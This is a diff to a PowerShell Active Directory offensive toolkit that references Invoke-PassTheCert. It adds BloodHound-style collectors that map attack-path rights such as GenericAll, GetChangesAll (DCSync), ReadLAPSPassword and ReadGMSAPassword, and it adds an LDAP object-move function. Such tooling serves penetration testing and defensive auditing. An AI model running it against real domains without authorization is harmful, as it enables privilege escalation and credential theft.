+        Add-Member -PassThru -Force -NotePropertyName 'ObjectIdentifier' -NotePropertyValue $_.objectsid |
+        Add-Member -PassThru -Force -NotePropertyName 'ObjectType' -NotePropertyValue $(_Helper-PowerHound-GetObjectType -ObjectClass $_.objectClass) |
+        Select-Object Objectidentifier,ObjectType
+    }
+}
+
+
+function _Helper-PowerHound-GetChildObjects {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the data entry's child objects to be populated into the BloodHound collection.
+
+        .PARAMETER LdapConnection
+
+            [System.DirectoryServices.Protocols.LdapConnection] 
+            
+            The established LDAP Connection Instance.
+
+        .PARAMETER LDAPObject
+
+            [PSCustomObject]
+
+            The LDAP PowerShell object from which to gather the Child Objects
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetChildObjects -LdapConnection $LdapConnection -LDAPObject $LDAPObject
+
+            Returns the child objects of an LDAP object to be injected into the BloodHound collection.
+
+        .OUTPUTS
+
+            [System.Collections.Hashtable[]] 
+            
+            The data entry's child objects to be populated into the BloodHound collection.
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
+        [ValidateNotNullorEmpty()]
+        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the LDAP object (probably an entry from the Filter action) from which to gather the BloodHound data child objects.")]
+        [ValidateNotNullorEmpty()]
+        [PSCustomObject]$LDAPObject
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    $Result = @()
+
+    # We won't enumerate some default children, to avoid MASSIVE BloodHound collections. 
+    # -> https://github.com/dirkjanm/BloodHound.py/blob/fd3f322e066d66314bfb31d4ae6f497df5872177/bloodhound/ad/utils.py#L430-437
+    # Comment the below condition at your own (and storage) risk !
+    if (-not ($ChildObject.distinguishedname -match "CN=PROGRAM DATA,DC=|CN=SYSTEM,DC=")) {
+        foreach ($ChildObject in _Filter -LdapConnection $LdapConnection -SearchScope OneLevel -SearchBase $LDAPObject.distinguishedname -Raw) {
+            $ObjectType = _Helper-PowerHound-GetObjectType -ObjectClass $ChildObject.objectClass
+            # The ObjectIdentifier BloodHound attributes depends on the object's type. For instance, for containers, this corresponds to its GUID, while for users, this corresponds to its SID.
+            if ($ObjectType -in @('Container', 'OU')) {
+                $ObjectIdentifier = _Helper-PowerHound-ConvertGUID -GUID $(_Helper-GetReadableValueOfBytes -Type 'objectGuid' -ArrayOfBytes $ChildObject.objectguid);
+            } elseif ($ObjectType -in @('User', 'Computer', 'Group')) {
+                $ObjectIdentifier = _Helper-GetReadableValueOfBytes -Type 'objectSid' -ArrayOfBytes $ChildObject.objectsid
+            } else {
+                # We'll only process known object types, whitelisted above.
+                continue
+            }
+            $Result += @{
+                "ObjectIdentifier" = $ObjectIdentifier
+                "ObjectType" = $ObjectType
+            }
+        }
+    }
+
+    return $Result;
+}
+
+
+function _Helper-PowerHound-GetLinks {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the data entry's GPO Links to be populated into the BloodHound collection.
+
+        .PARAMETER LdapConnection
+
+            [System.DirectoryServices.Protocols.LdapConnection] 
+            
+            The established LDAP Connection Instance.
+
+        .PARAMETER LDAPObject
+
+            [PSCustomObject]
+
+            The LDAP PowerShell object from which to gather the GPO Links
+
+        .PARAMETER BloodHoundObjects
+
+            [System.Collections.Hashtable]
+
+            The locally dumped BloodHound objects
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetLinks -LDAPObject $LDAPObject -BloodHoundObjects $BloodHoundObjects
+
+            Returns the GPO Links of an LDAP object to be injected into the BloodHound collection.
+
+        .OUTPUTS
+
+            [System.Collections.Hashtable[]] 
+            
+            The data entry's GPO Links to be populated into the BloodHound collection.
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP object (probably an entry from the Filter action) from which to gather the BloodHound data GPO Links.")]
+        [ValidateNotNullorEmpty()]
+        [PSCustomObject]$LDAPObject,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the BloodHound dumped objects from which to lookup stuff locally (you are probably calling this function from PowerHound !).")]
+        [ValidateNotNullorEmpty()]
+        [System.Collections.Hashtable]$BloodHoundObjects
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    $Result = @()
+    # Each GPOLink is a string looking like: LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=ADLAB,DC=LOCAL;0
+    foreach ($GPOLink in [regex]::Matches($LDAPObject.gplink, '(?<=\[).*?(?=\])').Value) {
+        $GPOLinkName = [regex]::Matches($GPOLink, '(?i)(?<=CN=){.*?}(?=,CN=Policies,CN=System,)').Value # E.g. {31B2F340-016D-11D2-945F-00C04FB984F9}
+        $GPOLinkIsEnforced = ($GPOLink -split ';')[-1] -eq '2'
+        $Result += @{
+            "GUID" = _Helper-PowerHound-ConvertGUID -GUID ($BloodHoundObjects['GPOObjects'] |Where-Object { $_.name -eq $GPOLinkName }).objectguid.ToString();
+            "isEnforced" = $GPOLinkisEnforced;
+        }
+    }
+    return $Result;
+}
+
+
+function _Helper-PowerHound-GetMembers {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the group data entry's members to be populated into the BloodHound collection.
+
+        .PARAMETER LDAPObject
+
+            [PSCustomObject]
+
+            The group LDAP PowerShell object from which to gather the members
+
+        .PARAMETER BloodHoundObjects
+
+            [System.Collections.Hashtable]
+
+            The locally dumped BloodHound objects
+        
+        .PARAMETER BloodHoundDNLookupTable
+
+            [System.Collections.Hashtable]
+
+            The BloodHound DN lookup table for instant local searching
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetMembers -LDAPObject $LDAPObject -BloodHoundObjects $BloodHoundObjects -BloodHoundDNLookupTable $BloodHoundDNLookupTable
+
+            Returns the members of a group LDAP object to be injected into the BloodHound collection, using the local BloodHound database to avoid generating more LDAP trafic.
+            
+        .OUTPUTS
+
+            [System.Collections.Hashtable[]] 
+            
+            The group data entry's members to be populated into the BloodHound collection.
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the group LDAP object (probably an entry from the Filter action) from which to gather the BloodHound data members.")]
+        [ValidateNotNullorEmpty()]
+        [PSCustomObject]$LDAPObject,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the BloodHound dumped objects from which to lookup stuff locally (you are probably calling this function from PowerHound !).")]
+        [ValidateNotNullorEmpty()]
+        [System.Collections.Hashtable]$BloodHoundObjects,
+
+        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the BloodHound DN lookup table (you are probably calling this function from PowerHound !).")]
+        [ValidateNotNullorEmpty()]
+        [System.Collections.Hashtable]$BloodHoundDNLookupTable
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    $Result = @()
+    
+    foreach ($MemberDN in $BloodHoundObjects["GroupObjects"] |Where-Object { $null -ne $_.member -and $_.distinguishedname -eq $LDAPObject.distinguishedname } |Select-Object -ExpandProperty member) {
+        $Member = $BloodHoundDNLookupTable[$MemberDN]
+        $ObjectType = _Helper-PowerHound-GetObjectType -ObjectClass $Member.objectClass
+        # The ObjectIdentifier BloodHound attributes depends on the object's type. For instance, for containers, this corresponds to its GUID, while for users, this corresponds to its SID.
+        if ($ObjectType -in @('Container', 'OU')) {
+            $ObjectIdentifier = _Helper-PowerHound-ConvertGUID -GUID $(_Helper-GetReadableValueOfBytes -Type 'objectGuid' -ArrayOfBytes $Member.objectguid);
+        } elseif ($ObjectType -in @('User', 'Computer', 'Group')) {
+            $ObjectIdentifier = _Helper-GetReadableValueOfBytes -Type 'objectSid' -ArrayOfBytes $Member.objectsid
+        } else {
+            # We'll only process known object types, whitelisted above.
+            continue
+        }
+        $Result += @{
+            "ObjectIdentifier" = $ObjectIdentifier
+            "ObjectType" = $ObjectType
+        }
+    }
+
+    return $Result;
+}
+
+
+function _Helper-PowerHound-ConvertAce {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the BloodHound's formatted RightName(s) of an Ace. In other words, this function explodes the Ace's Access Mask(s) into individual BloodHound-formatted Right Names.
+
+            - Returns `$null` if the BloodHound Ace is unknown (most probably existent, but not implemented yet)
+
+        .PARAMETER Ace
+
+            [PSCustomObject]
+
+            The Ace of the object to be formatted into the BloodHound format
+
+        .PARAMETER ObjectType
+
+            [System.String]
+
+            The type of the LDAP object against which the ACE applies.
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-ConvertAce -Ace $Ace -ObjectType 'Group'
+
+            Returns the Right Name(s) associated with the provided ACE, where the target of the ACE (i.e. the entry storing the ACE in its nTSecurityDescriptor) is a group.
+
+        .OUTPUTS
+
+            [System.String[]]
+            
+            The BloodHound's formatted RightName(s) of an Ace.
+        
+        .LINK
+
+            https://bloodhound.specterops.io/resources/edges/overview
+
+        .LINK
+
+            https://github.com/dirkjanm/BloodHound.py/blob/fd3f322e066d66314bfb31d4ae6f497df5872177/bloodhound/enumeration/acls.py
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Ace of the object to be formatted into the BloodHound format (you're probably calling this function from PowerHound !).")]
+        [ValidateNotNullorEmpty()]
+        [PSCustomObject]$Ace,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the type of the object against which the ACE are being enumerated (among 'Domain', 'OU', 'Group', 'GPO', 'Container', 'User', 'Computer') (you're probably calling this function from PowerHound !).")]
+        [ValidateNotNullorEmpty()]
+        [System.String]$ObjectType
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    $AccessMaskNames = $Ace.AccessMaskNames -split ', '
+
+    $Result = @()
+
+    if ($null -eq $Ace.ObjectAceTypeName) {
+
+        # GenericAll contains all rights, hence we return directly
+        if ($AccessMaskNames -contains 'GenericAll') { $Result += "GenericAll"; }
+
+        else {
+            if ($AccessMaskNames -contains 'WriteOwner') 
+                { $Result += "WriteOwner"; }
+
+            if ($AccessMaskNames -contains 'WriteDacl') 
+                { $Result += "WriteDacl"; }
+
+            if ($AccessMaskNames -contains 'WriteProperty') {
+                if ($ObjectType -in @('User', 'Group', 'Computer', 'GPO', 'OU')) 
+                    { $Result += "GenericWrite"; }
+                if ($ObjectType -in @('Group')) 
+                    { $Result += "AddMember"; }
+            }
+
+            if ($AccessMaskNames -contains 'ExtendedRight') { 
+                if ($ObjectType -in @('Domain', 'User')) 
+                    { $Result += "AllExtendedRights"; }
+            }
+
+            if ($AccessMaskNames -contains 'ExtendedRight') { 
+                if ($ObjectType -in @('Computer') -and -not ($Ace.SecurityIdentifier -match 'S-1-5-32-544|-512$')) 
+                    { $Result += "AllExtendedRights"; }
+            }
+
+            if ($AccessMaskNames -contains 'Self' -and -not ($Ace.SecurityIdentifier -match 'S-1-5-32-544|-512$|-519$')) {
+                if ($ObjectType -in @('Group')) 
+                    { $Result += "AddSelf"; }
+            }
+        }
+
+    } else {
+
+        if ($AccessMaskNames.Length -eq 1 -and $AccessMaskNames[0] -eq 'ExtendedRight') {
+            if ($ObjectType -eq 'Domain' -and $Ace.ObjectAceTypeName -eq 'DS-Replication-Get-Changes-In-Filtered-Set') 
+                { $Result += 'GetChangesInFilteredSet'; }
+            if ($ObjectType -eq 'Domain' -and $Ace.ObjectAceTypeName -eq 'DS-Replication-Get-Changes') 
+                { $Result += 'GetChanges'; }
+            if ($ObjectType -eq 'Domain' -and $Ace.ObjectAceTypeName -eq 'DS-Replication-Get-Changes-All') 
+                { $Result += 'GetChangesAll'; }
+            if ($ObjectType -in @('User', 'Computer') -and $Ace.ObjectAceTypeName -eq 'User-Force-Change-Password') 
+                { $Result += 'ForceChangePassword'; }
+        }
+
+        if ($AccessMaskNames -contains 'WriteProperty') {
+            #if ($ObjectType -eq 'Computer' -and $Ace.ObjectAceTypeName -eq 'msDS-AllowedToActOnBehalfOfOtherIdentity') 
+            #    { return 'AllowedToAct'; }
+            if ($ObjectType -in @('User', 'Computer') -and $Ace.ObjectAceTypeName -eq 'User-Account-Restrictions' -and -not ($Ace.SecurityIdentifier -match '-512$')) 
+                { $Result += 'WriteAccountRestrictions'; }
+            if ($ObjectType -eq 'OU' -and $Ace.ObjectAceTypeName -eq 'gPLink') 
+                { $Result += 'WriteGPLink'; }
+            if ($ObjectType -in @('User', 'Computer') -and $Ace.ObjectAceTypeName -eq 'msDS-KeyCredentialLink') 
+                { $Result += 'AddKeyCredentialLink'; }
+            if ($ObjectType -in @('User', 'Computer') -and $Ace.ObjectAceTypeName -eq 'servicePrincipalName') 
+                { $Result += 'WriteSPN'; }
+            if ($ObjectType -eq 'Group' -and $Ace.ObjectAceTypeName -eq 'Self-Membership') 
+                { $Result += 'AddSelf'; }
+            if ($Ace.ObjectAceTypeName -eq 'msPKI-Certificate-Name-Flag') 
+                { $Result += 'WritePKINameFlag'; }
+            if ($Ace.ObjectAceTypeName -eq 'msPKI-Enrollment-Flag') 
+                { $Result += 'WritePKIEnrollmentFlag'; }
+        }
+
+        if ($AccessMaskNames -contains 'ReadProperty') {
+            if ($ObjectType -eq 'Computer' -and $Ace.ObjectAceTypeName -in @('ms-mcs-admpwd', 'ms-laps-password', 'ms-laps-encryptedpassword')) 
+                { $Result += 'ReadLAPSPassword'; }
+            if ($ObjectType -eq 'User' -and $Ace.ObjectAceTypeName -in @('msDS-ManagedPassword')) 
+                { $Result += 'ReadGMSAPassword'; }
+        }
+ 
+    }
+
+    return $Result;
+}
+
+
+function _Helper-PowerHound-GetAces {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the data entry's ACEs to be populated into the BloodHound collection.
+
+        .PARAMETER LdapConnection
+
+            [System.DirectoryServices.Protocols.LdapConnection] 
+            
+            The established LDAP Connection Instance.
+
+        .PARAMETER LDAPObject
+
+            [PSCustomObject]
+
+            The LDAP PowerShell object from which to gather the ACEs
+        
+        .PARAMETER BloodHoundSIDLookupTable
+
+            [System.Collections.Hashtable]
+
+            The BloodHound SID lookup table for instant local searching
+        
+        .PARAMETER Domain
+
+            [System.String]
+
+            The domain being BloodHound-enumerated
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetAces -LdapConnection $LdapConnection -LDAPObject $LDAPObject -BloodHoundSIDLookupTable $BloodHoundSIDLookupTable -Domain 'ADLAB.LOCAL'
+
+            Returns the ACEs of an LDAP object to be injected into the BloodHound collection, using the local BloodHound database to avoid generating more LDAP trafic.
+            
+        .OUTPUTS
+
+            [System.Collections.Hashtable[]] 
+            
+            The data entry's ACEs to be populated into the BloodHound collection.
+
+        .LINK
+
+            https://github.com/dirkjanm/BloodHound.py/blob/fd3f322e066d66314bfb31d4ae6f497df5872177/bloodhound/enumeration/acls.py
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
+        [ValidateNotNullorEmpty()]
+        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the LDAP object (probably an entry from the Filter action) from which to gather the BloodHound data ACEs.")]
+        [ValidateNotNullorEmpty()]
+        [PSCustomObject]$LDAPObject,
+
+        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the BloodHound SID lookup table (you are probably calling this function from PowerHound !).")]
+        [ValidateNotNullorEmpty()]
+        [System.Collections.Hashtable]$BloodHoundSIDLookupTable,
+
+        [Parameter(Position=3, Mandatory=$true, HelpMessage="Enter the domain from which the BloodHound collection is performed (used to prefix a domain name to well-known principals, such as 'Authentication Users' group, which have no distinguishedname from which to gather the domain name).")]
+        [ValidateNotNullorEmpty()]
+        [System.String]$Domain
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    # SIDs to treat specifically are set in the following array: https://github.com/dirkjanm/BloodHound.py/blob/fd3f322e066d66314bfb31d4ae6f497df5872177/bloodhound/enumeration/acls.py#L60
+    $SpecialSIDs = @("S-1-3-0", "S-1-5-18", "S-1-5-10")
+
+    $Result = @()
+
+    # 'Owns' BloodHound edge
+    $OwnerSID = (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $LDAPObject.distinguishedname -Attribute 'nTSecurityDescriptor').Owner.Value
+    # As per the 'Owns' ACE, the special SIDs are sometimes owners of objects, but have NO distinguished name. For instance, "Local System", with SID "S-1-5-18", is the owner of "CN=MicrosoftDNS,CN=System,DC=X". Therefore, we can't get their domain name, and we assume the domain is the LDAP Object's one.
+    if ($OwnerSID -in $SpecialSIDs) {
+        $PrincipalSID = _Helper-PowerHound-ConvertSID -Domain $(_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname) -SID $OwnerSID -PrincipalName (_Helper-GetWellKnownSIDs)[$OwnerSID].Names[0];
+        $PrincipalType = _Helper-PowerHound-GetObjectType -ObjectClass (_Helper-GetWellKnownSIDs)[$OwnerSID].PrincipalType;
+    } else {
+        $Owner = $BloodHoundSIDLookupTable[$OwnerSID]
+        $PrincipalSID = _Helper-PowerHound-ConvertSID -Domain $(_Helper-GetDomainNameFromDN -DN $Owner.distinguishedname) -SID $OwnerSID -PrincipalName $Owner.name;
+        $PrincipalType = _Helper-PowerHound-GetObjectType -ObjectClass $Owner.objectclass;
+    }
+    $Result += @{
+        "PrincipalSID"  = $PrincipalSID;
+        "PrincipalType" = $PrincipalType;
+        "RightName"     = "Owns";
+        "IsInherited"   = $false;
+    }
+
+    # Aces BloodHound edges
+    # We won't enumerate some default containers, to avoid MASSIVE BloodHound collections. 
+    # -> https://github.com/dirkjanm/BloodHound.py/blob/fd3f322e066d66314bfb31d4ae6f497df5872177/bloodhound/ad/utils.py#L419-L427
+    # Comment the below condition at your own (and storage) risk !
+    if (-not ($LDAPObject.distinguishedname -match 'CN=DOMAINUPDATES,CN=SYSTEM,DC=' -or $LDAPObject.distinguishedname -match 'CN=(User|Machine)*,CN=POLICIES,CN=SYSTEM,DC=')) {
+        foreach ($Ace in _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $LDAPObject.distinguishedname |Where-Object { $_.AceQualifier -eq 'AccessAllowed' }) {
+            foreach ($RightName in _Helper-PowerHound-ConvertAce -Ace $Ace -ObjectType $(_Helper-PowerHound-GetObjectType -ObjectClass $LDAPObject.objectClass)) {
+                # Ignoring unknown / not implemented BloodHound ACE edges.
+                if (-not $null -eq $RightName) {
+                    $PrincipalSID = $Ace.SecurityIdentifier.Value
+
+                    # Some right names DO NOT match the real $Ace SID. Namely: 
+                    # -> ReadGMSAPassword BloodHound Edge's ACE has 'S-1-1-0' as the granted principal.
+                    #    However, the real granted principal is stored into the DACL of the LDAP object's 'msDS-GroupMSAMembership' attribute
+                    if ($RightName -eq 'ReadGMSAPassword') {
+                        $PrincipalSID = (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $LDAPObject.distinguishedname -Attribute 'msDS-GroupMSAMembership').DiscretionaryAcl.SecurityIdentifier.Value
+                    }
+
+                    # If the ACE is a built-in group (hence not in the LDAP-wise BloodHound Collection), get the type from the WellKnown table.
+                    if ($PrincipalSID -in (_Helper-GetWellKnownSIDs).Keys) {
+                        $PrincipalType = (_Helper-GetWellKnownSIDs)[$PrincipalSID].PrincipalType
+                        $PrincipalDomain = $Domain
+                    } 
+                    # Otherwise, gather it from the LDAP-wise dumped BlodHound Collections
+                    else {
+                        $PrincipalType = _Helper-PowerHound-GetObjectType -ObjectClass $BloodHoundSIDLookupTable[$PrincipalSID].objectclass
+                        $PrincipalDomain = _Helper-GetDomainNameFromDN -DN $BloodHoundSIDLookupTable[$PrincipalSID].distinguishedname
+                    }
+                    # We won't enumerate some default ACEs, to avoid MASSIVE BloodHound collections. 
+                    # -> https://github.com/dirkjanm/BloodHound.py/blob/fd3f322e066d66314bfb31d4ae6f497df5872177/bloodhound/enumeration/acls.py#L60
+                    # Comment the below condition at your own (and storage) risk !
+                    if (-not ($PrincipalSID -in $SpecialSIDs)) {
+                        $Result += @{
+                            "PrincipalSID"  = _Helper-PowerHound-ConvertSID -Domain $PrincipalDomain -SID $PrincipalSID;
+                            "PrincipalType" = $PrincipalType;
+                            "RightName"     = $RightName;
+                            "IsInherited"   = $Ace.IsInherited;
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    return $Result;
 }
 
 
@@ -7937,7 +9530,7 @@ function _Filter {
             Returns a list of [PSCustomObject] object(s) found by the LDAP query.
 
             - Suffixing the command with `|fl` pipe allows to print the multi-valued attributes conveniently, i.e. separated by new lines (e.g. `serviceprincipalename`, `memberof`) (no more "...").
-            - Returns $null if no entry is found.
+            - Returns `$null` if no entry is found.
 
         .PARAMETER LdapConnection
 
@@ -8003,7 +9596,7 @@ function _Filter {
 
             [Switch]
             
-            Whenever specified, returns the raw attributes of the found LDAP object's, i.e. without trying to convert it into human-readable format.
+            Whenever specified, returns the raw attributes of the found LDAP objects, i.e. without trying to convert it into human-readable format.
 
         .EXAMPLE
 
@@ -8334,10 +9927,10 @@ function _Filter {
         # Remove old page control before the next iteration
         [void]$SearchRequest.Controls.Remove($PageControl)  # Just to be sure, we'll also add the [void] mention hereto avoid a NULL prefixed entry in the output: https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.directorycontrolcollection.remove
 
-    } while (($Cookie -ne $null -and $Cookie.Length -gt 0))
+    } while (($null -ne $Cookie -and $Cookie.Length -gt 0))
 
     if ($ResultObjects.Length -eq 0) {
-        Write-Host "[!] No Entry Found ! Returning `$null..."
+        Write-Verbose "[!] No Entry Found ! Returning `$null..."
         return $null
     } else {
         # For each result object
@@ -8389,6 +9982,11 @@ function _Filter {
                         }
     
                         'objectguid' { 
+                            $AddMember = $true; 
+                            $NewMember = _Helper-GetReadableValueOfBytes -Type 'objectguid' -ArrayOfBytes $Property.Value 
+                        }
+    
+                        'schemaidguid' { 
                             $AddMember = $true; 
                             $NewMember = _Helper-GetReadableValueOfBytes -Type 'objectguid' -ArrayOfBytes $Property.Value 
                         }
@@ -9111,7 +10709,7 @@ function _CreateInboundACE {
 
             - You may manually check any `PrincipalTo*.txt` file, to get a glance of possible ACEs.
             - The inbound ACE to create MUST NOT already exist in the target's inbound ACEs (i.e. in its `nTSecurityDescriptor`).
-            - IdentitySID MAY be used instead of IdentityDN, especially when such SIDs can't be looked up domain-wise (e.g. Well-Known SIDs, such as 'S-1-1-0', i.e. `Everyone`).
+            - IdentitySID MAY be used instead of IdentityDN, especially when such SIDs can't be looked up domain-wise (e.g. Well-Known SIDs, such as `S-1-1-0`, i.e. `Everyone`).
 
         .PARAMETER LdapConnection
 
@@ -9410,8 +11008,8 @@ function _DeleteInboundACE {
             Deletes an inbound ACE for a principal into a targeted object. In other words, it deletes an ACE granted/denied to the principal (source) over the targeted object (destination)
 
             - You may manually check any `PrincipalTo*.txt` file, to get a glance of possible ACEs.
-            - The inbound ACE to delete MUST already exist in the target's inbound ACEs (i.e. in its 'nTSecurityDescriptor').
-            - IdentitySID MAY be used instead of IdentityDN, especially when such SIDs can't be looked up domain-wise (e.g. Well-Known SIDs, such as 'S-1-1-0', i.e. `Everyone`).
+            - The inbound ACE to delete MUST already exist in the target's inbound ACEs (i.e. in its `nTSecurityDescriptor`).
+            - IdentitySID MAY be used instead of IdentityDN, especially when such SIDs can't be looked up domain-wise (e.g. Well-Known SIDs, such as `S-1-1-0`, i.e. `Everyone`).
 
         .PARAMETER LdapConnection
 
@@ -9503,7 +11101,7 @@ function _DeleteInboundACE {
 
             Deletes the inbound ACE `[AceQualifier='AccessDenied', AccessMasks='Delete,DeleteTree', ObjectAceType=NULL]` provided to the principal `Everyone` against the `Unity` Organizational Unity. In other words, `Everyone` will no longer have `AccessDenied` restrictions against `OU=Unity,DC=X`
 
-            - Given that the principal is provided via its SID, no lookup is performed, and the ACE is deleted with the SID as is. For instance, 'S-1-1-0' is the well-known SID for `Everyone`, hence it can't be looked up via an DN, and must be specified by its SID directly.
+            - Given that the principal is provided via its SID, no lookup is performed, and the ACE is deleted with the SID as is. For instance, 'S-1-1-0' is the well-known SID for `Everyone`, hence it can't be looked up via a DN, and must be specified by its SID directly.
 
         .LINK
 
@@ -9697,7 +11295,7 @@ function _CreateInboundSDDL {
             Creates an inbound SDDL (Security Descriptor Definition Language) for a principal into a targeted object's attribute. In other words, it grants/denies an SDDL to the principal (source) over the attribute of a targeted object (destination).
 
             - You may check the `DeepDiveIntoACEsAndSDDLs` to get a glance of the SDDL format.
-            - IdentitySID MAY be used instead of IdentityDN, especially when such SIDs can't be looked up domain-wise (e.g. Well-Known SIDs, such as 'S-1-1-0', i.e. `Everyone`).
+            - IdentitySID MAY be used instead of IdentityDN, especially when such SIDs can't be looked up domain-wise (e.g. Well-Known SIDs, such as `S-1-1-0`, i.e. `Everyone`).
 
         .PARAMETER LdapConnection
 
@@ -9771,7 +11369,7 @@ function _CreateInboundSDDL {
 
             Creates an SDDL ACE entry denying the principal `EVERYONE` the following ACE Rights against the `OU=Unity,DC=X` object: `SDDL_DELETE_TREE`, `SDDL_STANDARD_DELETE`.
 
-            - Given that the principal is provided via its SID, no lookup is performed, and the SDDL's ACE is deleted with the SID as is. For instance, 'S-1-1-0' is the well-known SID for `Everyone`, hence it can't be looked up via an DN, and must be specified by its SID directly.
+            - Given that the principal is provided via its SID, no lookup is performed, and the SDDL's ACE is created with the SID as is. For instance, 'S-1-1-0' is the well-known SID for `Everyone`, hence it can't be looked up via a DN, and must be specified by its SID directly.
 
         .LINK   
 
@@ -10837,9 +12435,11 @@ function _RemoveGroupMember {
         [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
 
         [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the member to remove")]
+        [ValidateNotNullorEmpty()]
         [System.String]$IdentityDN,
 
         [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the distinguished name of the group")]
+        [ValidateNotNullorEmpty()]
         [System.String]$GroupDN
     )
     
@@ -10852,6 +12452,69 @@ function _RemoveGroupMember {
     Write-Host "[+] Successfully Removed Member '$IdentityDN' From Group '$GroupDN' !"
     Write-Host "[*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'GroupMembers' -Name '$(_Helper-GetCNFromDN -DN $GroupDN)'"
     Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'AddGroupMember' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -GroupDN '$GroupDN'"
+}
+
+
+function _MoveIdentity {
+
+    <#
+
+        .SYNOPSIS
+
+            Moves an identity from its current location to a new container / OU (editing the identity's Distinguished Name).
+        
+        .PARAMETER LdapConnection
+        
+            The established LDAP Connection Instance.
+
+        .PARAMETER IdentityDN
+
+            The current Distinguished Name of the object to move.
+
+        .PARAMETER TargetDN
+
+            The Distinguished Name of the new container / OU.
+        
+        .EXAMPLE
+
+            _MoveIdentity -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -TargetDN 'OU=OrganizedOU,DC=X'
+        
+            Moves the entity `John JD. DOE` from container `CN=Users,DC=X` to the Organizational Unit `OU=OrganizedOU,DC=X`
+
+        .LINK
+
+            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.modifydnrequest
+
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true)]
+        [ValidateNotNullorEmpty()]
+        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
+
+        [Parameter(Position=1, Mandatory=$true)]
+        [ValidateNotNullorEmpty()]
+        [System.String]$IdentityDN,
+
+        [Parameter(Position=2, Mandatory=$true)]
+        [ValidateNotNullorEmpty()]
+        [System.String]$TargetDN
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    Write-Verbose "[*] Moving '$IdentityDN' to '$TargetDN'..."
+
+    $LdapConnection.SendRequest(
+        (New-Object System.DirectoryServices.Protocols.ModifyDNRequest(
+            $IdentityDN,
+            $TargetDN,
+            $(_Helper-GetRDNFromDN -DN $IdentityDN)
+        ))
+    ) |Out-Null
+
+    Write-Host "[+] Successfully Moved '$IdentityDN' To '$TargetDN'!"
+    
 }
 
 
@@ -10886,11 +12549,17 @@ function _LDAPEnum {
 
             - Defaults to 'Base' for RootDSE enumeration, and to 'Subtree' otherwise.
 
+        .PARAMETER Raw
+
+            [Switch]
+            
+            Whenever specified, returns the raw attributes of the found LDAP objects, i.e. without trying to convert it into human-readable format.
+
         .EXAMPLE
 
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'RootDSE'
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'RootDSE' -Raw
 
-            Returns the `RootDSE` in the LDAP/S Server's Domain (in particular: DC Functionality, Forest Functionality, Domain Functionality, Server Name, Schema Naming Context, Configuration Naming Context, dNSHostName, Default Naming Context)
+            Returns the `RootDSE` in the LDAP/S Server's Domain (in particular: DC Functionality, Forest Functionality, Domain Functionality, Server Name, Schema Naming Context, Configuration Naming Context, dNSHostName, Default Naming Context), without translating the LDAP attributes into human-readable format
 
         .EXAMPLE
 
@@ -11161,7 +12830,10 @@ function _LDAPEnum {
         [System.String]$Name,
         
         [Parameter(Position=4, Mandatory=$false, HelpMessage="Enter the Distinguished Name of the thing to enumerate")]
-        [System.String]$ObjectDN
